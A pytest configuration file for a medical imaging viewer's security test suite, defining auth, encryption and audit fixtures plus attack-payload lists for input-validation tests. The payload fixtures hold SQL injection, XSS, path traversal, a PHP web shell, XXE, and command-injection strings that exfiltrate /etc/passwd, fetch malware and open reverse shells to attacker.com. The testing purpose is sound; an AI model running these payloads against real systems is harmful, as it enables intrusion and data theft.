"""
Pytest Configuration and Security Testing Fixtures
Medical Imaging Viewer - Comprehensive Security Test Suite

ISO 27001 A.14.2.8 - System security testing
ISO 27001 A.14.2.9 - System acceptance testing
OWASP ASVS 4.0 - Application Security Verification Standard

This module provides state-of-the-art testing infrastructure including:
- Property-based testing with Hypothesis
- Security attack payload fixtures
- Authentication and authorization testing
- Encryption and cryptography validation
- Rate limiting and DoS protection testing
- Compliance validation (ISO 27001, HIPAA, NIST)

@module tests.conftest
@version 2.0.0 - Enterprise Security Testing Suite
"""

import os
import sys
import pytest
import asyncio
from typing import AsyncGenerator, Generator, Dict, List
from pathlib import Path
from httpx import AsyncClient, ASGITransport

# Ensure project root in path
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from app.main import app
from app.core.container import Container
from app.core.config import get_settings

# Override environment for testing
os.environ['ENVIRONMENT'] = 'testing'
os.environ['DEBUG'] = 'false'
os.environ['JWT_SECRET_KEY'] = 'test-secret-key-minimum-32-characters-required-for-security'
os.environ['ENCRYPTION_MASTER_KEY'] = 'dGVzdC1lbmNyeXB0aW9uLW1hc3Rlci1rZXktMzItYnl0ZXMtcmVxdWlyZWQ='

settings = get_settings()


@pytest.fixture(scope="session")
def event_loop() -> Generator:
    """Create event loop for async tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def container() -> Container:
    """Create a fresh container for each test."""
    container = Container()
    container.wire(modules=["app.api.routes.drive", "app.api.routes.imaging", "app.api.routes.segmentation"])
    yield container
    container.unwire()


@pytest.fixture
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Create an async HTTP client for testing FastAPI endpoints."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        yield client


@pytest.fixture
def sample_dicom_metadata() -> dict:
    """Sample DICOM metadata for testing."""
    return {
        "patient_id": "TEST001",
        "patient_name": "Test Patient",
        "study_date": "20240101",
        "study_description": "Test Study",
        "series_description": "Test Series",
        "modality": "CT",
        "manufacturer": "Test Manufacturer",
        "institution_name": "Test Hospital",
        "rows": 512,
        "columns": 512,
        "slices": 100,
        "pixel_spacing": [0.5, 0.5],
        "slice_thickness": 1.0,
        "window_center": 40,
        "window_width": 400,
    }


@pytest.fixture
def sample_image_shape() -> dict:
    """Sample image shape for segmentation tests."""
    return {
        "rows": 512,
        "columns": 512,
        "slices": 100,
    }


@pytest.fixture
def sample_label_info() -> list:
    """Sample label information for segmentation tests."""
    return [
        {"id": 0, "name": "Background", "color": "#000000", "opacity": 0.0, "visible": False},
        {"id": 1, "name": "Lesion", "color": "#FF0000", "opacity": 0.5, "visible": True},
        {"id": 2, "name": "Organ", "color": "#00FF00", "opacity": 0.5, "visible": True},
    ]


# =============================================================================
# AUTHENTICATION & AUTHORIZATION FIXTURES
# ISO 27001 A.9.2.1 - User registration and de-registration
# ISO 27001 A.9.2.2 - User access provisioning
# =============================================================================

@pytest.fixture
def password_manager():
    """Create password manager for testing."""
    from app.core.security.auth import PasswordManager
    return PasswordManager()


@pytest.fixture
def token_manager():
    """Create token manager for testing."""
    from app.core.security.auth import TokenManager
    return TokenManager(
        secret_key=settings.JWT_SECRET_KEY,
        algorithm="HS256",
        access_token_expire_minutes=30,
        refresh_token_expire_days=7
    )


@pytest.fixture
def test_user_data() -> dict:
    """Test user data for authentication tests."""
    return {
        "username": "test_user",
        "email": "test@example.com",
        "password": "SecureP@ssw0rd123!",
        "full_name": "Test User",
        "role": "viewer",
    }


@pytest.fixture
def admin_user_data() -> dict:
    """Admin user data for authorization tests."""
    return {
        "username": "admin_user",
        "email": "admin@example.com",
        "password": "AdminP@ssw0rd123!",
        "full_name": "Admin User",
        "role": "admin",
    }


@pytest.fixture
def radiologist_user_data() -> dict:
    """Radiologist user data for RBAC tests."""
    return {
        "username": "radiologist_user",
        "email": "radiologist@example.com",
        "password": "RadioP@ssw0rd123!",
        "full_name": "Dr. Radiologist",
        "role": "radiologist",
    }


@pytest.fixture
async def test_user(test_user_data: dict, password_manager):
    """Create test user with hashed password."""
    from app.models.security import User

    user = User(
        username=test_user_data["username"],
        email=test_user_data["email"],
        password_hash=password_manager.hash_password(test_user_data["password"]),
        full_name=test_user_data["full_name"],
        role=test_user_data["role"],
        is_active=True,
    )
    return user


@pytest.fixture
async def admin_user(admin_user_data: dict, password_manager):
    """Create admin user with hashed password."""
    from app.models.security import User

    user = User(
        username=admin_user_data["username"],
        email=admin_user_data["email"],
        password_hash=password_manager.hash_password(admin_user_data["password"]),
        full_name=admin_user_data["full_name"],
        role=admin_user_data["role"],
        is_active=True,
    )
    return user


@pytest.fixture
def test_access_token(test_user, token_manager) -> str:
    """Generate access token for test user."""
    return token_manager.create_access_token(
        data={"sub": test_user.username, "role": test_user.role}
    )


@pytest.fixture
def admin_access_token(admin_user, token_manager) -> str:
    """Generate access token for admin user."""
    return token_manager.create_access_token(
        data={"sub": admin_user.username, "role": admin_user.role}
    )


@pytest.fixture
def auth_headers(test_access_token: str) -> dict:
    """Authentication headers for test user."""
    return {"Authorization": f"Bearer {test_access_token}"}


@pytest.fixture
def admin_auth_headers(admin_access_token: str) -> dict:
    """Authentication headers for admin user."""
    return {"Authorization": f"Bearer {admin_access_token}"}


# =============================================================================
# SECURITY ATTACK PAYLOAD FIXTURES
# ISO 27001 A.14.2.8 - System security testing
# OWASP ASVS 4.0 - Security testing requirements
# =============================================================================

@pytest.fixture
def sql_injection_payloads() -> List[str]:
    """
    SQL injection attack payloads for security testing.

    Based on OWASP Top 10 2021 - A03:2021 – Injection
    """
    return [
        # Classic SQL injection
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",

        # Union-based injection
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username, password FROM users--",

        # Blind SQL injection
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",

        # Stacked queries
        "'; DROP TABLE users--",
        "'; DELETE FROM users WHERE '1'='1",

        # Time-based injection
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' WAITFOR DELAY '00:00:05'--",

        # Error-based injection
        "' AND 1=CONVERT(int, (SELECT @@version))--",

        # NoSQL injection
        "{'$ne': null}",
        "{'$gt': ''}",

        # Second-order injection
        "admin'||'",

        # Advanced bypass techniques
        "' oR '1'='1",  # Case variation
        "' OR/*comment*/1=1--",  # Comment injection
        "' OR 0x31=0x31--",  # Hex encoding
    ]


@pytest.fixture
def xss_payloads() -> List[str]:
    """
    Cross-Site Scripting (XSS) attack payloads.

    Based on OWASP Top 10 2021 - A03:2021 – Injection
    """
    return [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",

        # Event handlers
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<iframe onload=alert('XSS')>",

        # JavaScript protocol
        "javascript:alert('XSS')",
        "<a href='javascript:alert(\"XSS\")'>Click</a>",

        # Data URI
        "<object data='data:text/html,<script>alert(\"XSS\")</script>'>",

        # Encoded payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode

        # DOM-based XSS
        "<img src='x' onerror='document.location=\"http://attacker.com?cookie=\"+document.cookie'>",

        # Mutation XSS
        "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",

        # Filter bypass
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;('XSS')\">",

        # Context-specific XSS
        "'-alert('XSS')-'",  # JavaScript context
        "\"/><script>alert('XSS')</script>",  # Attribute context
    ]


@pytest.fixture
def command_injection_payloads() -> List[str]:
    """
    OS command injection attack payloads.

    Based on OWASP Top 10 2021 - A03:2021 – Injection
    """
    return [
        # Basic command injection
        "; ls -la",
        "& dir",
        "| cat /etc/passwd",

        # Command chaining
        "&& whoami",
        "|| uname -a",

        # Command substitution
        "`whoami`",
        "$(whoami)",

        # Windows-specific
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| dir C:\\",

        # Linux-specific
        "; cat /etc/shadow",
        "| wget http://attacker.com/malware.sh",

        # Data exfiltration
        "; curl -X POST -d @/etc/passwd http://attacker.com",

        # Reverse shell attempts
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "| nc -e /bin/sh attacker.com 4444",

        # Time-based detection
        "; sleep 10",
        "& timeout /t 10",

        # Filter bypass
        ";${IFS}cat${IFS}/etc/passwd",
        "|{cat,/etc/passwd}",

        # Null byte injection
        "; cat /etc/passwd%00",
    ]


@pytest.fixture
def path_traversal_payloads() -> List[str]:
    """
    Path traversal attack payloads.

    Based on OWASP Top 10 2021 - A01:2021 – Broken Access Control
    """
    return [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",

        # Absolute paths
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",

        # URL encoding
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",

        # Double encoding
        "..%252F..%252F..%252Fetc%252Fpasswd",

        # Unicode/UTF-8 encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",

        # Null byte injection
        "../../../etc/passwd%00.jpg",

        # Mixed separators
        "..\\../..\\../etc/passwd",

        # UNC paths (Windows)
        "\\\\?\\C:\\Windows\\System32\\config\\sam",

        # Filter bypass
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",

        # Medical imaging specific
        "../../../app/data/patients/sensitive_data.dcm",
        "../../uploads/private_study.nii.gz",
    ]


@pytest.fixture
def malicious_file_payloads() -> Dict[str, bytes]:
    """
    Malicious file upload payloads for security testing.

    Tests file upload validation and malware detection.
    """
    return {
        # EICAR test file (antivirus test standard)
        "eicar.txt": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",

        # ZIP bomb (decompression bomb)
        "zipbomb_marker.txt": b"PK\x03\x04" + b"\x00" * 100,  # ZIP file marker

        # PHP web shell
        "webshell.php": b"<?php system($_GET['cmd']); ?>",

        # Polyglot file (valid JPEG + executable)
        "polyglot.jpg": b"\xFF\xD8\xFF\xE0" + b"MZ" + b"\x00" * 100,

        # XXE attack in XML
        "xxe.xml": b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',

        # SVG with XSS
        "xss.svg": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',

        # Null byte filename attack
        "image.jpg\x00.php": b"\xFF\xD8\xFF\xE0",

        # Over-sized file marker (for testing file size limits)
        "oversized_marker.txt": b"X" * 1000,  # Marker for large file tests
    }


# =============================================================================
# ENCRYPTION & CRYPTOGRAPHY FIXTURES
# ISO 27001 A.10.1.1 - Policy on the use of cryptographic controls
# ISO 27001 A.10.1.2 - Key management
# =============================================================================

@pytest.fixture
def encryption_service():
    """Create encryption service for testing."""
    from app.core.security.encryption import EncryptionService
    return EncryptionService(master_key=settings.ENCRYPTION_MASTER_KEY)


@pytest.fixture
def sample_plaintext_data() -> Dict[str, str]:
    """Sample plaintext data for encryption tests."""
    return {
        "patient_name": "John Doe",
        "ssn": "123-45-6789",
        "diagnosis": "Type 2 Diabetes Mellitus",
        "medication": "Metformin 500mg BID",
        "medical_record_number": "MRN-2024-001",
    }


@pytest.fixture
def sample_phi_data() -> dict:
    """
    Sample Protected Health Information (PHI) for HIPAA compliance testing.

    HIPAA Security Rule 164.312(a)(2)(iv) - Encryption and decryption
    """
    return {
        "patient_id": "PAT-2024-12345",
        "first_name": "Jane",
        "last_name": "Smith",
        "date_of_birth": "1985-06-15",
        "ssn": "987-65-4321",
        "phone": "+1-555-0123",
        "email": "jane.smith@example.com",
        "address": "123 Medical Plaza, Suite 456, Healthcare City, HC 12345",
        "emergency_contact": "John Smith, Spouse, +1-555-0124",
        "insurance_id": "INS-ABC-123456789",
        "medical_history": [
            "Hypertension - diagnosed 2020",
            "Asthma - childhood onset",
            "Appendectomy - 2015"
        ],
        "current_medications": [
            "Lisinopril 10mg daily",
            "Albuterol inhaler PRN"
        ],
        "allergies": ["Penicillin", "Latex"],
        "primary_physician": "Dr. Michael Johnson, MD",
        "last_visit": "2024-11-01",
        "next_appointment": "2025-02-15",
    }


# =============================================================================
# RATE LIMITING & DOS PROTECTION FIXTURES
# ISO 27001 A.12.2.1 - Controls against malware
# ISO 27001 A.13.1.3 - Segregation in networks
# =============================================================================

@pytest.fixture
def rate_limiter():
    """Create rate limiter for testing."""
    from app.core.security.rate_limiter import get_rate_limiter
    return get_rate_limiter()


@pytest.fixture
def mock_client_ips() -> List[str]:
    """Mock client IP addresses for rate limiting tests."""
    return [
        "192.168.1.100",
        "192.168.1.101",
        "10.0.0.50",
        "172.16.0.10",
        "203.0.113.42",  # TEST-NET-3 (RFC 5737)
    ]


@pytest.fixture
def malicious_ip_addresses() -> List[str]:
    """Known malicious IP addresses for blacklist testing."""
    return [
        "198.51.100.1",  # TEST-NET-2 (simulated attacker)
        "198.51.100.2",
        "198.51.100.3",
    ]


# =============================================================================
# TLS/SSL CERTIFICATE FIXTURES
# ISO 27001 A.13.1.1 - Network controls
# ISO 27001 A.13.2.1 - Information transfer policies and procedures
# =============================================================================

@pytest.fixture
def sample_cert_metadata() -> dict:
    """Sample certificate metadata for TLS testing."""
    return {
        "common_name": "medical-imaging-viewer.local",
        "organization": "Medical Imaging Viewer Test",
        "country": "US",
        "state": "California",
        "locality": "San Francisco",
        "valid_days": 365,
        "key_size": 2048,
    }


# =============================================================================
# COMPLIANCE & AUDIT FIXTURES
# ISO 27001 A.12.4.1 - Event logging
# ISO 27001 A.12.4.3 - Administrator and operator logs
# =============================================================================

@pytest.fixture
def sample_security_events() -> List[dict]:
    """Sample security events for audit logging tests."""
    return [
        {
            "event_type": "authentication_success",
            "username": "test_user",
            "ip_address": "192.168.1.100",
            "timestamp": "2024-11-23T10:30:00Z",
            "metadata": {"method": "jwt"}
        },
        {
            "event_type": "authentication_failure",
            "username": "attacker",
            "ip_address": "198.51.100.1",
            "timestamp": "2024-11-23T10:31:00Z",
            "metadata": {"reason": "invalid_credentials", "attempts": 5}
        },
        {
            "event_type": "rate_limit_exceeded",
            "ip_address": "198.51.100.2",
            "timestamp": "2024-11-23T10:32:00Z",
            "metadata": {"endpoint": "/api/auth/login", "limit": 5}
        },
        {
            "event_type": "encryption_operation",
            "operation": "encrypt",
            "data_classification": "HIGHLY_RESTRICTED",
            "timestamp": "2024-11-23T10:33:00Z",
            "metadata": {"algorithm": "AES-256-GCM"}
        },
        {
            "event_type": "sql_injection_blocked",
            "ip_address": "198.51.100.3",
            "timestamp": "2024-11-23T10:34:00Z",
            "metadata": {"payload": "' OR '1'='1", "endpoint": "/api/patients/search"}
        },
    ]


# =============================================================================
# MEDICAL IMAGING TEST DATA FIXTURES
# Domain-specific security testing
# =============================================================================

@pytest.fixture
def sample_dicom_file_path(tmp_path) -> Path:
    """Create temporary DICOM file for upload testing."""
    dicom_file = tmp_path / "test_ct_scan.dcm"

    # Minimal valid DICOM file structure
    # DICOM magic number + minimal required tags
    dicom_content = (
        b"\x00" * 128 +  # Preamble
        b"DICM" +  # Magic number
        b"\x02\x00\x00\x00\x55\x4C\x04\x00" +  # File Meta Information Group Length
        b"\x31\x00\x30\x00"  # ImplementationVersionName
    )

    dicom_file.write_bytes(dicom_content)
    return dicom_file


@pytest.fixture
def sample_nifti_file_path(tmp_path) -> Path:
    """Create temporary NIfTI file for upload testing."""
    nifti_file = tmp_path / "test_mri_scan.nii.gz"

    # NIfTI-1 header structure (simplified)
    import struct
    header = struct.pack(
        '<i',  # sizeof_hdr (must be 348)
        348
    ) + b"\x00" * 344  # Rest of header

    nifti_file.write_bytes(header)
    return nifti_file


@pytest.fixture
def malicious_dicom_payloads() -> List[bytes]:
    """Malicious DICOM file payloads for security testing."""
    return [
        # Fake DICOM with embedded script
        b"DICM<script>alert('XSS')</script>",

        # DICOM with path traversal in filename
        b"DICM" + b"../../../etc/passwd",

        # Oversized DICOM header
        b"DICM" + b"X" * (1024 * 1024 * 100),  # 100MB

        # Invalid DICOM magic number
        b"FAKE" + b"\x00" * 200,
    ]


# =============================================================================
# PYTEST CONFIGURATION & MARKERS
# =============================================================================

def pytest_configure(config):
    """Configure pytest markers for test categorization."""
    config.addinivalue_line(
        "markers", "security: Security-specific tests (ISO 27001 A.14.2.8)"
    )
    config.addinivalue_line(
        "markers", "authentication: Authentication and authorization tests"
    )
    config.addinivalue_line(
        "markers", "encryption: Cryptography and encryption tests"
    )
    config.addinivalue_line(
        "markers", "rate_limiting: Rate limiting and DoS protection tests"
    )
    config.addinivalue_line(
        "markers", "input_validation: Input validation and sanitization tests"
    )
    config.addinivalue_line(
        "markers", "tls: TLS/SSL enforcement tests"
    )
    config.addinivalue_line(
        "markers", "audit: Audit logging and compliance tests"
    )
    config.addinivalue_line(
        "markers", "integration: Integration and end-to-end tests"
    )
    config.addinivalue_line(
        "markers", "performance: Performance and load tests"
    )
    config.addinivalue_line(
        "markers", "compliance: ISO 27001/HIPAA compliance tests"
    )
    config.addinivalue_line(
        "markers", "fuzzing: Security fuzzing tests"
    )
    config.addinivalue_line(
        "markers", "property: Property-based tests with Hypothesis"
    )
    config.addinivalue_line(
        "markers", "slow: Tests that take significant time to run"
    )


# =============================================================================
# UTILITY ASSERTION FIXTURES
# =============================================================================

@pytest.fixture
def assert_security_headers():
    """Utility to assert security headers are present in responses."""
    def _assert_headers(response):
        """Verify all required security headers are present."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": lambda v: "max-age=" in v,
            "Content-Security-Policy": lambda v: len(v) > 0,
        }

        for header, expected in required_headers.items():
            assert header in response.headers, f"Missing security header: {header}"

            if callable(expected):
                assert expected(response.headers[header]), \
                    f"Invalid {header}: {response.headers[header]}"
            elif expected is not None:
                assert response.headers[header] == expected, \
                    f"Invalid {header}: expected {expected}, got {response.headers[header]}"

    return _assert_headers


@pytest.fixture
def assert_audit_log():
    """Utility to assert audit log entries are created."""
    async def _assert_log(event_type: str, username: str = None):
        """Verify audit log entry exists for the given event."""
        # This would query your audit log storage
        # Placeholder implementation
        from app.core.logging import get_logger
        logger = get_logger(__name__)

        # In real implementation, query audit log database/file
        logger.info(f"Verifying audit log for event: {event_type}, user: {username}")

        # For now, just verify logger is accessible
        assert logger is not None

    return _assert_log
